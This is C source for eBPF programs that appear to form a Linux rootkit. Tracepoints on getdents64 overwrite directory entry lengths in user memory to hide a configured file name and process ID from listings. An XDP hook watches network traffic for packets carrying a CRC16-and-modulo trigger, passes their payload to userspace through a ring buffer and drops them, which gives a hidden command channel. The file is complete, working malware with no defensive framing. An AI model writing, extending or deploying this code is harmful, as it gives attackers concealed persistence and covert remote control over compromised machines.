```c
#include "vmlinux.h"
#include "common.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

#define ETH_P_IP	0x0800

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __type(key, __u64); 
    __type(value, struct linux_dirent64*); 
    __uint(max_entries, 1024);
} getdents64_enter_log SEC(".maps");



#define MAX_STR_LEN 16
// Helper function to compare two strings
static __inline int my_strcmp(const char *s1, const char *s2) {
    for (int i = 0; i < MAX_STR_LEN; i++) {
        if (s1[i] != s2[i]) {
            return s1[i] - s2[i];
        }
        if (s1[i] == '\0') {
            break;
        }
    }
    return 0;
}

const char pid_to_hidden[MAX_STR_LEN];
const char file_name_to_hidden[MAX_STR_LEN];


SEC("tp/syscalls/sys_enter_getdents64")
int tp_sys_enter_getdents64(struct trace_event_raw_sys_enter *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    if(pid_tgid<0){
        return 0;
    }
    
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&getdents64_enter_log,&pid_tgid,&dirp,BPF_ANY);
	
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int tp_sys_exit_getdents64(struct trace_event_raw_sys_exit *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 **dirpp = NULL;
    struct linux_dirent64 *dirp = NULL;
    
    struct linux_dirent64 *prev_dirp = NULL;
    struct linux_dirent64 *now_dirp = NULL;

    __u64 total_size = 0;
    __u64 now_offset = 0;
    __u64 prev_offset = 0;
    __u64 already_handle_dirent = 0;

    char d_name[255];

    if(pid_tgid<0){
        return 0;
    }
    
    if(ctx->ret <= 0){
        return 0;
    }
    total_size = ctx->ret;

    dirpp = bpf_map_lookup_elem(&getdents64_enter_log,&pid_tgid);
    if(dirpp == NULL){
        return 0;
    }
    dirp = *dirpp;
    
    while( (now_offset < total_size) && (already_handle_dirent < 260) ){
        now_dirp = (struct linux_dirent64*)((char*)dirp + now_offset);

        bpf_core_read_user_str(d_name,sizeof(d_name),&now_dirp->d_name);
        
        //first dirent will always . and ..
        if(my_strcmp(d_name,file_name_to_hidden) == 0){
            prev_dirp = (struct linux_dirent64*)((char*)dirp + prev_offset);
            short unsigned int d_reclen = BPF_CORE_READ_USER(prev_dirp,d_reclen) + BPF_CORE_READ_USER(now_dirp,d_reclen);
            bpf_probe_write_user(&prev_dirp->d_reclen,&d_reclen,sizeof(prev_dirp->d_reclen));
        }
        if(my_strcmp(d_name,pid_to_hidden) == 0){
            prev_dirp = (struct linux_dirent64*)((char*)dirp + prev_offset);
            short unsigned int d_reclen = BPF_CORE_READ_USER(prev_dirp,d_reclen) + BPF_CORE_READ_USER(now_dirp,d_reclen);
            bpf_probe_write_user(&prev_dirp->d_reclen,&d_reclen,sizeof(prev_dirp->d_reclen));
        }

        prev_offset = now_offset;
        now_offset += BPF_CORE_READ_USER(now_dirp,d_reclen);
        already_handle_dirent++;
    }

    return 0;
}

// ANSI CRC16查找表
static const uint16_t crc16_table[256] = {
    0x0000, 0x8005, 0x800F, 0x000A, 0x801B, 0x001E, 0x0014, 0x8011,
    0x8033, 0x0036, 0x003C, 0x8039, 0x0028, 0x802D, 0x8027, 0x0022,
    0x8063, 0x0066, 0x006C, 0x8069, 0x0078, 0x807D, 0x8077, 0x0072,
    0x0050, 0x8055, 0x805F, 0x005A, 0x804B, 0x004E, 0x0044, 0x8041,
    0x80C3, 0x00C6, 0x00CC, 0x80C9, 0x00D8, 0x80DD, 0x80D7, 0x00D2,
    0x00F0, 0x80F5, 0x80FF, 0x00FA, 0x80EB, 0x00EE, 0x00E4, 0x80E1,
    0x00A0, 0x80A5, 0x80AF, 0x00AA, 0x80BB, 0x00BE, 0x00B4, 0x80B1,
    0x8093, 0x0096, 0x009C, 0x8099, 0x0088, 0x808D, 0x8087, 0x0082,
    0x8183, 0x0186, 0x018C, 0x8189, 0x0198, 0x819D, 0x8197, 0x0192,
    0x01B0, 0x81B5, 0x81BF, 0x01BA, 0x81AB, 0x01AE, 0x01A4, 0x81A1,
    0x01E0, 0x81E5, 0x81EF, 0x01EA, 0x81FB, 0x01FE, 0x01F4, 0x81F1,
    0x81D3, 0x01D6, 0x01DC, 0x81D9, 0x01C8, 0x81CD, 0x81C7, 0x01C2,
    0x0140, 0x8145, 0x814F, 0x014A, 0x815B, 0x015E, 0x0154, 0x8151,
    0x8173, 0x0176, 0x017C, 0x8179, 0x0168, 0x816D, 0x8167, 0x0162,
    0x8123, 0x0126, 0x012C, 0x8129, 0x0138, 0x813D, 0x8137, 0x0132,
    0x0110, 0x8115, 0x811F, 0x011A, 0x810B, 0x010E, 0x0104, 0x8101,
    0x8303, 0x0306, 0x030C, 0x8309, 0x0318, 0x831D, 0x8317, 0x0312,
    0x0330, 0x8335, 0x833F, 0x033A, 0x832B, 0x032E, 0x0324, 0x8321,
    0x0360, 0x8365, 0x836F, 0x036A, 0x837B, 0x037E, 0x0374, 0x8371,
    0x8353, 0x0356, 0x035C, 0x8359, 0x0348, 0x834D, 0x8347, 0x0342,
    0x03C0, 0x83C5, 0x83CF, 0x03CA, 0x83DB, 0x03DE, 0x03D4, 0x83D1,
    0x83F3, 0x03F6, 0x03FC, 0x83F9, 0x03E8, 0x83ED, 0x83E7, 0x03E2,
    0x83A3, 0x03A6, 0x03AC, 0x83A9, 0x03B8, 0x83BD, 0x83B7, 0x03B2,
    0x0390, 0x8395, 0x839F, 0x039A, 0x838B, 0x038E, 0x0384, 0x8381,
    0x0280, 0x8285, 0x828F, 0x028A, 0x829B, 0x029E, 0x0294, 0x8291,
    0x82B3, 0x02B6, 0x02BC, 0x82B9, 0x02A8, 0x82AD, 0x82A7, 0x02A2,
    0x82E3, 0x02E6, 0x02EC, 0x82E9, 0x02F8, 0x82FD, 0x82F7, 0x02F2,
    0x02D0, 0x82D5, 0x82DF, 0x02DA, 0x82CB, 0x02CE, 0x02C4, 0x82C1,
    0x8243, 0x0246, 0x024C, 0x8249, 0x0258, 0x825D, 0x8257, 0x0252,
    0x0270, 0x8275, 0x827F, 0x027A, 0x826B, 0x026E, 0x0264, 0x8261,
    0x0220, 0x8225, 0x822F, 0x022A, 0x823B, 0x023E, 0x0234, 0x8231,
    0x8213, 0x0216, 0x021C, 0x8219, 0x0208, 0x820D, 0x8207, 0x0202};

struct {
    __uint(type,BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries,256*1024);
}payload_ringbuf SEC(".maps");

SEC("xdp")
int xdp_prog(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    struct ethhdr *eth = data;

    __u16 h_proto = 0;
    uint8_t *payload_start = NULL;
    uint16_t checksum = 0;
    uint16_t net_checksum = 0;
    uint16_t trigger_fragment2_len = 0;
    uint16_t validator = 0;
    uint16_t payload_offset = 0;
    uint16_t *p_net_checksum;
    uint16_t *p_validator;

    if (data + sizeof(struct ethhdr) > data_end)
        return XDP_DROP;

    h_proto = eth->h_proto;

    if (h_proto == bpf_htons(ETH_P_IP)){
        struct iphdr *ip = (struct iphdr*)((char*)data +sizeof(struct ethhdr));
        if( (void*)((char *)ip + sizeof(struct iphdr)) > data_end)
            return XDP_DROP;

        if(ip->protocol == IPPROTO_TCP){
            struct tcphdr *tcp = (struct tcphdr*)((char*)ip+ip->ihl*4);
            if( (void*)((char*)tcp + sizeof(struct tcphdr)) >data_end )
                return XDP_DROP;

            payload_start = (uint8_t*)tcp + tcp->doff * 4;
        }else if(ip->protocol == IPPROTO_UDP){
            struct udphdr *udp = (struct udphdr*)((char*)ip+ip->ihl*4);
            if( (void*)((char*)udp + sizeof(struct udphdr)) >data_end )
                return XDP_DROP;
            payload_start = (uint8_t*)udp + sizeof(struct udphdr);
        }else{
            return XDP_PASS;
        }
    
        if((void *)payload_start > data_end )
            return XDP_PASS;
        
        
        if((__u64)(data_end) - (__u64)(payload_start) > MAX_PAYLOAD_LEN)
            return XDP_PASS;
        
        if((void*)(payload_start + START_PAD + CRC_DATA_LENGTH) > data_end)
            return XDP_PASS;

        for (size_t byte = 0; byte < CRC_DATA_LENGTH; ++byte){
            uint8_t pos = (checksum >> 8) ^ *(uint8_t*)(payload_start + START_PAD + byte );
            checksum = (checksum << 8) ^ crc16_table[pos];
        }
        
        trigger_fragment2_len = checksum % RANDOM_PAD_MAX_LEN;
        payload_offset = START_PAD + CRC_DATA_LENGTH + trigger_fragment2_len;

        //https://blog.path.net/ebpf-xdp-and-network-security/
        asm volatile("%0 &= 0x1FF" : "=r"(payload_offset) : "0"(payload_offset));//payload = payload&0x1ff;
        p_net_checksum  = (uint16_t*)(payload_start + payload_offset);
        if((void*)p_net_checksum > (void*)data_end || (void*)p_net_checksum < (void*)payload_start){
            return XDP_PASS;
        }
        if( (void*)( (char*)p_net_checksum+2 ) > data_end  )
            return XDP_PASS;
        net_checksum = *p_net_checksum;
        net_checksum = bpf_ntohs(net_checksum);
    
        if(checksum != net_checksum){
            return XDP_PASS;
        }


        payload_offset += 2;
        //https://blog.path.net/ebpf-xdp-and-network-security/
        asm volatile("%0 &= 0x1FF" : "=r"(payload_offset) : "0"(payload_offset));
        p_validator  = (uint16_t*)(payload_start + payload_offset);
        if( (void*)p_validator > (void*)data_end || (void*)p_validator < (void*)payload_start){
            return XDP_PASS;
        }
        if( (void*)( (char*)p_validator+2 ) > data_end  )
            return XDP_PASS;
        validator = *p_validator;
        validator = bpf_ntohs(validator);
    
        if((validator%127) != 0){
            return XDP_PASS;
        }


        //checked payload!!!!
        
        uint8_t *payload  = bpf_ringbuf_reserve(&payload_ringbuf,MAX_PAYLOAD_LEN,0);
        if(payload == NULL){
           return XDP_PASS;
        }
        bpf_core_read(payload,(__u64)(data_end) - (__u64)(payload_start),payload_start);
        bpf_ringbuf_submit(payload,0);

        return XDP_DROP;
    }

    return XDP_PASS;
}

char LICENSE[] SEC("license") = "GPL";
```

